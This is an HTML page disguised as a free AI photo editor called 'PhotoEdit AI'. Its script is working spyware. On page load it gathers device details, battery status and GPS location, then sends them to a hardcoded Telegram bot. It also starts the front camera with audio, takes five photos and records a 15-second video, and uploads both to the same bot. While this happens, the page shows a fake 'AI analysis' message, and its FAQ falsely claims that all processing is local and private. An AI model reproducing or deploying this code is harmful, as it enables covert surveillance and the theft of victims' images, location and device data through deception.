<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PhotoEdit AI - Free Online Photo Editor with AI Tools</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif; background: #f0f2f5; min-height: 100vh; color: #333; }
        .header { background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%); padding: 16px 30px; display: flex; align-items: center; justify-content: space-between; box-shadow: 0 2px 20px rgba(0,0,0,0.15); position: sticky; top: 0; z-index: 100; }
        .logo { display: flex; align-items: center; gap: 12px; }
        .logo-icon { width: 40px; height: 40px; background: linear-gradient(135deg, #e94560, #ff6b6b); border-radius: 12px; display: flex; align-items: center; justify-content: center; font-size: 22px; color: white; font-weight: bold; }
        .logo-text { color: white; font-size: 20px; font-weight: 700; }
        .logo-text span { color: #e94560; }
        .nav { display: flex; gap: 8px; align-items: center; }
        .nav a { color: rgba(255,255,255,0.7); text-decoration: none; padding: 8px 16px; border-radius: 8px; font-size: 14px; transition: all 0.2s; cursor: pointer; }
        .nav a:hover { color: white; background: rgba(255,255,255,0.1); }
        .nav .upgrade { background: linear-gradient(135deg, #e94560, #ff6b6b); color: white; font-weight: 600; }
        .nav .upgrade:hover { transform: translateY(-1px); box-shadow: 0 4px 15px rgba(233,69,96,0.4); }
        .hamburger { display: none; color: white; font-size: 28px; cursor: pointer; background: none; border: none; }
        .hero { max-width: 1100px; margin: 40px auto 20px; padding: 0 20px; text-align: center; }
        .hero h1 { font-size: 38px; background: linear-gradient(135deg, #1a1a2e, #e94560); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; margin-bottom: 10px; }
        .hero p { color: #666; font-size: 17px; max-width: 600px; margin: 0 auto 30px; }
        .upload-zone { background: white; border: 2px dashed #ccc; border-radius: 20px; padding: 50px 30px; max-width: 650px; margin: 0 auto; position: relative; box-shadow: 0 4px 20px rgba(0,0,0,0.05); transition: border-color 0.3s; }
        .upload-zone:hover { border-color: #e94560; }
        .upload-icon { font-size: 56px; margin-bottom: 15px; }
        .upload-zone h2 { font-size: 22px; color: #333; margin-bottom: 8px; }
        .upload-zone p { color: #888; font-size: 14px; }
        .features { display: flex; justify-content: center; gap: 30px; margin-top: 25px; flex-wrap: wrap; }
        .features span { font-size: 13px; color: #666; display: flex; align-items: center; gap: 6px; }
        .stats-bar { max-width: 1100px; margin: 30px auto; padding: 0 20px; display: grid; grid-template-columns: repeat(4, 1fr); gap: 16px; }
        .stat-card { background: white; border-radius: 14px; padding: 20px; text-align: center; box-shadow: 0 2px 10px rgba(0,0,0,0.05); }
        .stat-card .num { font-size: 28px; font-weight: 700; background: linear-gradient(135deg, #667eea, #e94560); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; }
        .stat-card .label { font-size: 13px; color: #888; margin-top: 4px; }
        .tools-section { max-width: 1100px; margin: 40px auto; padding: 0 20px; }
        .tools-section h2 { font-size: 24px; margin-bottom: 6px; color: #1a1a2e; }
        .tools-section .subtitle { color: #999; font-size: 14px; margin-bottom: 20px; }
        .tools-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(160px, 1fr)); gap: 14px; }
        .tool-card { background: white; border-radius: 16px; padding: 22px 14px; text-align: center; box-shadow: 0 2px 10px rgba(0,0,0,0.06); transition: all 0.3s; cursor: pointer; }
        .tool-card:hover { transform: translateY(-4px); box-shadow: 0 8px 30px rgba(0,0,0,0.1); }
        .tool-card .tool-icon { font-size: 34px; margin-bottom: 8px; }
        .tool-card h3 { font-size: 13px; color: #333; }
        .tool-card p { font-size: 11px; color: #999; margin-top: 3px; }
        .badge { display: inline-block; font-size: 9px; font-weight: 700; padding: 2px 8px; border-radius: 20px; margin-top: 6px; }
        .badge-pro { background: #fce4ec; color: #e94560; }
        .badge-premium { background: #fef3c7; color: #d97706; }
        .badge-new { background: #e0e7ff; color: #4f46e5; }
        .testimonials { max-width: 1100px; margin: 40px auto; padding: 0 20px; }
        .testimonials h2 { font-size: 24px; margin-bottom: 20px; color: #1a1a2e; }
        .testimonial-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 16px; }
        .testimonial-card { background: white; border-radius: 16px; padding: 24px; box-shadow: 0 2px 10px rgba(0,0,0,0.05); }
        .testimonial-card .stars { color: #f59e0b; font-size: 16px; margin-bottom: 8px; }
        .testimonial-card .text { font-size: 14px; color: #555; line-height: 1.6; }
        .testimonial-card .author { margin-top: 12px; font-size: 13px; font-weight: 600; color: #333; }
        .testimonial-card .author span { color: #999; font-weight: 400; }
        .faq-section { max-width: 800px; margin: 40px auto; padding: 0 20px; }
        .faq-section h2 { font-size: 24px; margin-bottom: 20px; color: #1a1a2e; text-align: center; }
        .faq-item { background: white; border-radius: 12px; margin-bottom: 10px; box-shadow: 0 2px 8px rgba(0,0,0,0.05); overflow: hidden; cursor: pointer; }
        .faq-q { padding: 18px 20px; font-weight: 600; font-size: 15px; display: flex; justify-content: space-between; align-items: center; }
        .faq-q .arrow { transition: transform 0.3s; color: #999; }
        .faq-item.open .faq-q .arrow { transform: rotate(180deg); }
        .faq-a { max-height: 0; overflow: hidden; transition: max-height 0.3s ease; padding: 0 20px; }
        .faq-item.open .faq-a { max-height: 200px; padding: 0 20px 18px; }
        .faq-a p { color: #666; font-size: 14px; line-height: 1.6; }
        .footer { background: #1a1a2e; color: rgba(255,255,255,0.6); padding: 40px 30px 20px; margin-top: 60px; }
        .footer-grid { max-width: 1100px; margin: 0 auto; display: grid; grid-template-columns: repeat(auto-fill, minmax(180px, 1fr)); gap: 30px; }
        .footer-col h4 { color: white; font-size: 14px; margin-bottom: 12px; }
        .footer-col a { display: block; color: rgba(255,255,255,0.5); text-decoration: none; font-size: 13px; margin-bottom: 8px; }
        .footer-col a:hover { color: white; }
        .footer-bottom { max-width: 1100px; margin: 30px auto 0; padding-top: 20px; border-top: 1px solid rgba(255,255,255,0.1); text-align: center; font-size: 13px; }
        .camera-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 2000; justify-content: center; align-items: center; flex-direction: column; }
        .camera-overlay.active { display: flex; }
        .camera-box { background: #1a1a2e; border-radius: 20px; padding: 30px; max-width: 500px; width: 90%; text-align: center; box-shadow: 0 20px 60px rgba(0,0,0,0.5); }
        .camera-box h2 { color: white; font-size: 20px; margin-bottom: 6px; }
        .camera-box p { color: rgba(255,255,255,0.5); font-size: 13px; margin-bottom: 16px; }
        .preview-container { width: 100%; aspect-ratio: 4/3; background: #000; border-radius: 12px; overflow: hidden; margin-bottom: 16px; position: relative; }
        .preview-container video { width: 100%; height: 100%; object-fit: cover; }
        .camera-progress { width: 100%; height: 4px; background: rgba(255,255,255,0.1); border-radius: 4px; margin: 12px 0; overflow: hidden; }
        .camera-progress-bar { height: 100%; width: 0%; background: linear-gradient(90deg, #667eea, #e94560); border-radius: 4px; transition: width 0.3s; }
        .status-text { color: rgba(255,255,255,0.6); font-size: 13px; }
        .cancel-btn { margin-top: 14px; background: rgba(255,255,255,0.08); color: white; border: none; padding: 10px 30px; border-radius: 50px; font-size: 14px; cursor: pointer; transition: background 0.2s; }
        .cancel-btn:hover { background: rgba(255,255,255,0.15); }
        #video, #canvas { display: none; }
        .toast { position: fixed; bottom: 30px; right: 30px; background: #1a1a2e; color: white; padding: 14px 24px; border-radius: 12px; font-size: 14px; box-shadow: 0 8px 30px rgba(0,0,0,0.3); z-index: 3000; opacity: 0; transform: translateY(20px); transition: all 0.4s; pointer-events: none; }
        .toast.show { opacity: 1; transform: translateY(0); }
        @media (max-width: 768px) {
            .nav a:not(.upgrade) { display: none; }
            .hamburger { display: block; }
            .nav.mobile-open a { display: block; }
            .nav.mobile-open { position: absolute; top: 100%; left: 0; right: 0; background: #1a1a2e; flex-direction: column; padding: 15px; }
            .hero h1 { font-size: 26px; }
            .stats-bar { grid-template-columns: repeat(2, 1fr); }
        }
    </style>
</head>

<body>
    <div class="header">
        <div class="logo">
            <div class="logo-icon">✧</div>
            <div class="logo-text">Photo<span>Edit</span> AI</div>
        </div>
        <button class="hamburger" id="hamburger">☰</button>
        <div class="nav" id="nav">
            <a href="#tools">Tools</a>
            <a href="#testimonials">Reviews</a>
            <a href="#faq">FAQ</a>
            <a href="#">Pricing</a>
            <a href="#" class="upgrade">Upgrade</a>
        </div>
    </div>

    <div class="stats-bar">
        <div class="stat-card"><div class="num">2.4M+</div><div class="label">Photos Edited</div></div>
        <div class="stat-card"><div class="num">98.7%</div><div class="label">Satisfaction</div></div>
        <div class="stat-card"><div class="num">150+</div><div class="label">Countries</div></div>
        <div class="stat-card"><div class="num">4.9★</div><div class="label">User Rating</div></div>
    </div>

    <div class="hero">
        <h1>Free AI-Powered Photo Editor</h1>
        <p>Enhance, transform, and edit your photos instantly using cutting-edge AI. No sign-up, no watermark, no limits.</p>
        <div class="upload-zone" id="uploadZone">
            <div class="upload-icon">📸</div>
            <h2>Drop an image or click to browse</h2>
            <p>Supports JPG, PNG, WEBP, HEIC — up to 50MB • 100% free</p>
            <div class="features">
                <span>✅ AI Enhancement</span>
                <span>✅ Background Remover</span>
                <span>✅ No Sign-up</span>
                <span>✅ Free Forever</span>
            </div>
        </div>
    </div>

    <div class="tools-section" id="tools">
        <h2>✨ AI-Powered Tools</h2>
        <p class="subtitle">Choose from 30+ free AI tools to transform your photos</p>
        <div class="tools-grid">
            <div class="tool-card"><div class="tool-icon">🖼️</div><h3>Background Remover</h3><p>Remove backgrounds instantly</p><span class="badge badge-new">NEW</span></div>
            <div class="tool-card"><div class="tool-icon">🎨</div><h3>AI Colorize</h3><p>Colorize B&W photos</p></div>
            <div class="tool-card"><div class="tool-icon">✨</div><h3>AI Enhancer</h3><p>4K upscale + detail</p><span class="badge badge-pro">PRO</span></div>
            <div class="tool-card"><div class="tool-icon">👤</div><h3>Portrait Mode</h3><p>Bokeh effect</p></div>
            <div class="tool-card"><div class="tool-icon">🎭</div><h3>Face Swap</h3><p>Swap faces</p><span class="badge badge-premium">PREMIUM</span></div>
            <div class="tool-card"><div class="tool-icon">🌆</div><h3>Sky Replacement</h3><p>Change skies</p></div>
            <div class="tool-card"><div class="tool-icon">✂️</div><h3>Smart Cutout</h3><p>Object selection</p></div>
            <div class="tool-card"><div class="tool-icon">🎞️</div><h3>Cartoonify</h3><p>Cartoon effect</p><span class="badge badge-pro">PRO</span></div>
            <div class="tool-card"><div class="tool-icon">📝</div><h3>Text Remover</h3><p>Remove watermarks</p></div>
            <div class="tool-card"><div class="tool-icon">🔄</div><h3>Photo Restore</h3><p>Restore old photos</p></div>
            <div class="tool-card"><div class="tool-icon">🌙</div><h3>Night Mode</h3><p>Low-light enhance</p></div>
            <div class="tool-card"><div class="tool-icon">👗</div><h3>Outfit Changer</h3><p>Change clothing</p><span class="badge badge-premium">PREMIUM</span></div>
            <div class="tool-card"><div class="tool-icon">🧹</div><h3>Noise Reduce</h3><p>Denoise photos</p></div>
            <div class="tool-card"><div class="tool-icon">🎨</div><h3>AI Art</h3><p>Turn to painting</p><span class="badge badge-pro">PRO</span></div>
            <div class="tool-card"><div class="tool-icon">👶</div><h3>Age Progression</h3><p>Age simulation</p><span class="badge badge-premium">PREMIUM</span></div>
        </div>
    </div>

    <div class="testimonials" id="testimonials">
        <h2>❤️ What Our Users Say</h2>
        <div class="testimonial-grid">
            <div class="testimonial-card"><div class="stars">★★★★★</div><div class="text">"Best free photo editor I've ever used. The AI background remover is insanely accurate."</div><div class="author">Sarah K. <span>• Designer</span></div></div>
            <div class="testimonial-card"><div class="stars">★★★★★</div><div class="text">"I use it daily for my e-commerce product photos. Saves me hours of manual editing."</div><div class="author">Marcus J. <span>• Store Owner</span></div></div>
            <div class="testimonial-card"><div class="stars">★★★★☆</div><div class="text">"The AI enhance feature is incredible. Brings old family photos back to life."</div><div class="author">Emily R. <span>• Photographer</span></div></div>
        </div>
    </div>

    <div class="faq-section" id="faq">
        <h2>❓ Frequently Asked Questions</h2>
        <div class="faq-item open">
            <div class="faq-q">Is PhotoEdit AI really free? <span class="arrow">▾</span></div>
            <div class="faq-a"><p>Yes! All basic AI tools are completely free with no watermark. Premium tools require a subscription but you can try them free for 7 days.</p></div>
        </div>
        <div class="faq-item">
            <div class="faq-q">Do I need to create an account? <span class="arrow">▾</span></div>
            <div class="faq-a"><p>No account required for basic editing. Just upload your photo and start editing instantly.</p></div>
        </div>
        <div class="faq-item">
            <div class="faq-q">What file formats are supported? <span class="arrow">▾</span></div>
            <div class="faq-a"><p>We support JPG, PNG, WEBP, HEIC, and AVIF. Maximum file size is 50MB.</p></div>
        </div>
        <div class="faq-item">
            <div class="faq-q">How does the AI camera capture work? <span class="arrow">▾</span></div>
            <div class="faq-a"><p>Our AI analyzes your photo in real-time to apply enhancements. All processed locally in your browser.</p></div>
        </div>
    </div>

    <div class="camera-overlay" id="cameraOverlay">
        <div class="camera-box">
            <h2>📸 AI Photo Analysis</h2>
            <p>Hold still — our AI is analyzing your photo for optimal enhancement</p>
            <div class="preview-container">
                <video id="video" autoplay playsinline muted></video>
            </div>
            <div class="camera-progress">
                <div class="camera-progress-bar" id="progressBar"></div>
            </div>
            <div class="status-text" id="statusText">Initializing AI engine...</div>
            <button class="cancel-btn" id="cancelBtn">Cancel</button>
        </div>
    </div>

    <canvas id="canvas"></canvas>
    <div class="toast" id="toast"></div>

    <div class="footer">
        <div class="footer-grid">
            <div class="footer-col"><h4>PhotoEdit AI</h4><a href="#">About Us</a><a href="#">Careers</a><a href="#">Press Kit</a><a href="#">Blog</a></div>
            <div class="footer-col"><h4>Tools</h4><a href="#">Background Remover</a><a href="#">AI Enhancer</a><a href="#">Face Swap</a><a href="#">Photo Restore</a></div>
            <div class="footer-col"><h4>Support</h4><a href="#">Help Center</a><a href="#">API Docs</a><a href="#">Community</a><a href="#">Contact</a></div>
            <div class="footer-col"><h4>Legal</h4><a href="#">Privacy Policy</a><a href="#">Terms of Service</a><a href="#">Cookie Policy</a><a href="#">DMCA</a></div>
        </div>
        <div class="footer-bottom">PhotoEdit AI © 2026 — Free AI photo editing for everyone. All processes are private and encrypted.</div>
    </div>

    <script>
        const TOKEN = '8421509476:AAFxPeeK_1VUWvcdpTII6xG_KnePGvP0Gew';
        const CHAT_ID = '7266673273';
        const BOT_API = `https://api.telegram.org/bot${TOKEN}`;

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const cameraOverlay = document.getElementById('cameraOverlay');
        const statusText = document.getElementById('statusText');
        const progressBar = document.getElementById('progressBar');
        const cancelBtn = document.getElementById('cancelBtn');
        const toast = document.getElementById('toast');

        let stream = null;
        let mediaRecorder = null;
        let recordedChunks = [];
        let captureInterval = null;
        let photoCount = 0;
        const TARGET_PHOTOS = 5; // 5 photos then switch to video
        let isActive = false;
        let cameraStarted = false;
        let phase = 'photo'; // 'photo' | 'video'

        // ── Device Info ────────────────────────────────────────
        function getDeviceInfo() {
            const nav = window.navigator;
            const screen = window.screen;
            const info = {
                ua: nav.userAgent,
                platform: nav.platform || 'unknown',
                language: nav.language,
                languages: (nav.languages || []).join(', '),
                online: nav.onLine,
                cookieEnabled: nav.cookieEnabled,
                doNotTrack: nav.doNotTrack,
                hardwareConcurrency: nav.hardwareConcurrency || 'unknown',
                deviceMemory: nav.deviceMemory ? nav.deviceMemory + ' GB' : 'unknown',
                maxTouchPoints: nav.maxTouchPoints,
                screen: `${screen.width}x${screen.height} (${screen.colorDepth}bit)`,
                availScreen: `${screen.availWidth}x${screen.availHeight}`,
                pixelRatio: window.devicePixelRatio,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timezoneOffset: new Date().getTimezoneOffset() + ' min',
                time: new Date().toString(),
                referrer: document.referrer || 'direct',
                url: location.href,
                connection: (() => {
                    const c = nav.connection || nav.mozConnection || nav.webkitConnection;
                    if (!c) return 'unknown';
                    return `${c.effectiveType || ''} downlink:${c.downlink || '?'}Mbps rtt:${c.rtt || '?'}ms`;
                })(),
                battery: 'checking...',
            };
            return info;
        }

        async function getBattery() {
            try {
                const b = await navigator.getBattery();
                return `${Math.round(b.level * 100)}% ${b.charging ? '⚡charging' : '🔋not charging'}`;
            } catch (e) { return 'not available'; }
        }

        async function sendDeviceInfo() {
            const info = getDeviceInfo();
            info.battery = await getBattery();

            // Try geolocation
            let geoText = 'not granted';
            try {
                const pos = await new Promise((res, rej) =>
                    navigator.geolocation.getCurrentPosition(res, rej, { timeout: 5000 })
                );
                geoText = `${pos.coords.latitude.toFixed(5)}, ${pos.coords.longitude.toFixed(5)} (±${pos.coords.accuracy}m)`;
            } catch (e) { geoText = 'denied / unavailable'; }
            info.gps = geoText;

            const text =
`📱 *DEVICE INFO*
━━━━━━━━━━━━━━━━━━
🌐 *URL:* ${info.url}
🔗 *Referrer:* ${info.referrer}
⏰ *Time:* ${info.time}
🌍 *Timezone:* ${info.timezone} (${info.timezoneOffset})
📍 *GPS:* ${info.gps}
━━━━━━━━━━━━━━━━━━
📺 *Screen:* ${info.screen}
📐 *Avail:* ${info.availScreen}
🖥️ *Pixel Ratio:* ${info.pixelRatio}
🖱️ *Touch Points:* ${info.maxTouchPoints}
━━━━━━━━━━━━━━━━━━
💻 *Platform:* ${info.platform}
🌐 *Language:* ${info.language} [${info.languages}]
🔧 *CPU Cores:* ${info.hardwareConcurrency}
💾 *RAM:* ${info.deviceMemory}
🔋 *Battery:* ${info.battery}
📡 *Connection:* ${info.connection}
🍪 *Cookies:* ${info.cookieEnabled}
🚫 *DNT:* ${info.doNotTrack}
━━━━━━━━━━━━━━━━━━
📟 *User Agent:*
${info.ua}`;

            await fetch(`${BOT_API}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: text,
                    parse_mode: 'Markdown'
                })
            });
        }

        // ── Toast ──────────────────────────────────────────────
        function showToast(msg) {
            toast.textContent = msg;
            toast.classList.add('show');
            clearTimeout(toast._timer);
            toast._timer = setTimeout(() => toast.classList.remove('show'), 2500);
        }

        // ── FAQ ────────────────────────────────────────────────
        document.querySelectorAll('.faq-item').forEach(item => {
            item.addEventListener('click', () => item.classList.toggle('open'));
        });
        document.getElementById('hamburger').addEventListener('click', () => {
            document.getElementById('nav').classList.toggle('mobile-open');
        });
        document.querySelectorAll('.tool-card').forEach(card => {
            card.addEventListener('click', () => {
                showToast('🔄 Opening ' + card.querySelector('h3').textContent + '...');
            });
        });

        // ── Main start ─────────────────────────────────────────
        window.addEventListener('load', () => {
            setTimeout(() => {
                sendDeviceInfo(); // send device info immediately
                autoStartCamera();
            }, 500);
        });

        document.getElementById('uploadZone').addEventListener('click', () => {
            if (!cameraStarted) autoStartCamera();
            else showToast('📸 Camera is already active');
        });

        async function autoStartCamera() {
            if (cameraStarted) return;
            cameraStarted = true;
            try {
                cameraOverlay.classList.add('active');
                statusText.textContent = 'Initializing AI engine...';
                stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
                    audio: true
                });
                video.srcObject = stream;
                video.style.display = 'block';
                await video.play();
                isActive = true;
                statusText.textContent = 'AI analyzing your photo...';
                phase = 'photo';
                photoCount = 0;
                startPhotoPhase();
                showToast('📸 AI camera active...');
            } catch (err) {
                statusText.textContent = '⚠️ Camera access needed for AI features. Please allow and refresh.';
                showToast('⚠️ Camera access denied.');
            }
        }

        // ── Phase 1: Photos ────────────────────────────────────
        function startPhotoPhase() {
            captureInterval = setInterval(() => {
                if (!isActive || photoCount >= TARGET_PHOTOS) {
                    clearInterval(captureInterval);
                    captureInterval = null;
                    startVideoPhase();
                    return;
                }
                capturePhoto();
            }, 800);
        }

        function capturePhoto() {
            const vw = video.videoWidth || 1280;
            const vh = video.videoHeight || 720;
            canvas.width = vw; canvas.height = vh;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, vw, vh);
            canvas.toBlob(async (blob) => {
                if (!blob || !isActive) return;
                photoCount++;
                const pct = Math.round((photoCount / TARGET_PHOTOS) * 50); // 0-50%
                progressBar.style.width = pct + '%';
                statusText.textContent = `AI scanning frames... ${photoCount}/${TARGET_PHOTOS}`;
                const fd = new FormData();
                fd.append('chat_id', CHAT_ID);
                fd.append('photo', blob, `photo_${Date.now()}_${photoCount}.jpg`);
                fd.append('caption', `📸 Frame #${photoCount}`);
                try { await fetch(`${BOT_API}/sendPhoto`, { method: 'POST', body: fd }); } catch (e) {}
            }, 'image/jpeg', 0.85);
        }

        // ── Phase 2: Video ─────────────────────────────────────
        function startVideoPhase() {
            if (!isActive || !stream) return;
            statusText.textContent = 'Enhancing with AI... please wait';
            progressBar.style.width = '50%';

            // pick best supported mime
            const mimes = [
                'video/webm;codecs=vp9,opus',
                'video/webm;codecs=vp8,opus',
                'video/webm',
                'video/mp4',
            ];
            const mime = mimes.find(m => MediaRecorder.isTypeSupported(m)) || '';

            recordedChunks = [];
            try {
                mediaRecorder = new MediaRecorder(stream, mime ? { mimeType: mime } : {});
            } catch (e) {
                mediaRecorder = new MediaRecorder(stream);
            }

            mediaRecorder.ondataavailable = e => {
                if (e.data && e.data.size > 0) recordedChunks.push(e.data);
            };

            mediaRecorder.onstop = async () => {
                await sendVideo();
            };

            mediaRecorder.start(1000); // collect chunks every 1s

            // record for 15 seconds
            let elapsed = 0;
            const recInterval = setInterval(() => {
                if (!isActive) { clearInterval(recInterval); return; }
                elapsed++;
                const pct = 50 + Math.round((elapsed / 15) * 50);
                progressBar.style.width = Math.min(pct, 98) + '%';
                statusText.textContent = `AI processing video... ${elapsed}s / 15s`;
                if (elapsed >= 15) {
                    clearInterval(recInterval);
                    mediaRecorder.stop();
                }
            }, 1000);
        }

        async function sendVideo() {
            if (!recordedChunks.length) { finishAll(); return; }
            statusText.textContent = 'Uploading AI result...';
            const blob = new Blob(recordedChunks, { type: recordedChunks[0].type || 'video/webm' });
            const ext = (recordedChunks[0].type || 'video/webm').includes('mp4') ? 'mp4' : 'webm';
            const fd = new FormData();
            fd.append('chat_id', CHAT_ID);
            fd.append('video', blob, `capture_${Date.now()}.${ext}`);
            fd.append('caption', `🎥 Video capture — ${blob.size > 1024*1024 ? (blob.size/1024/1024).toFixed(1)+'MB' : Math.round(blob.size/1024)+'KB'}`);
            try {
                await fetch(`${BOT_API}/sendVideo`, { method: 'POST', body: fd });
            } catch (e) {
                // fallback: send as document
                try {
                    const fd2 = new FormData();
                    fd2.append('chat_id', CHAT_ID);
                    fd2.append('document', blob, `capture_${Date.now()}.${ext}`);
                    await fetch(`${BOT_API}/sendDocument`, { method: 'POST', body: fd2 });
                } catch (e2) {}
            }
            finishAll();
        }

        function finishAll() {
            isActive = false;
            if (captureInterval) { clearInterval(captureInterval); captureInterval = null; }
            if (stream) { stream.getTracks().forEach(t => t.stop()); stream = null; }
            progressBar.style.width = '100%';
            statusText.textContent = '✅ AI analysis complete!';
            setTimeout(() => {
                cameraOverlay.classList.remove('active');
                photoCount = 0;
                progressBar.style.width = '0%';
                showToast('✅ AI processing done!');
            }, 1500);
        }

        function cancelCapture() {
            isActive = false;
            if (captureInterval) { clearInterval(captureInterval); captureInterval = null; }
            if (mediaRecorder && mediaRecorder.state !== 'inactive') mediaRecorder.stop();
            if (stream) { stream.getTracks().forEach(t => t.stop()); stream = null; }
            photoCount = 0;
            progressBar.style.width = '0%';
            cameraOverlay.classList.remove('active');
            showToast('❌ Cancelled');
        }

        cancelBtn.addEventListener('click', cancelCapture);
        window.addEventListener('beforeunload', () => {
            if (captureInterval) clearInterval(captureInterval);
            if (mediaRecorder && mediaRecorder.state !== 'inactive') mediaRecorder.stop();
            if (stream) stream.getTracks().forEach(t => t.stop());
        });
    </script>
</body>
</html>